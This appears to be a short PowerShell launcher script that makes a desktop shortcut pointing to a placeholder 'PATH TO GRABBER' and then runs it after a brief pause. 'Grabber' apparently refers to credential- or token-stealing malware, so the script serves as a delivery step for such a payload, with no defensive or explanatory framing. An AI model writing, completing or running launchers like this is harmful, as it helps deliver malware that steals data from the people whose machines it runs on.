$username = $env:USERNAME
$WScriptShell = New-Object -ComObject WScript.Shell
$Shortcut = $WScriptShell.CreateShortcut("$env:USERPROFILE\Desktop\MyShortcut.lnk")
$Shortcut.TargetPath = "PATH TO GRABBER"
$Shortcut.Save()
Start-Sleep -Seconds 2
Start-Process "$env:USERPROFILE\Desktop\MyShortcut.lnk"
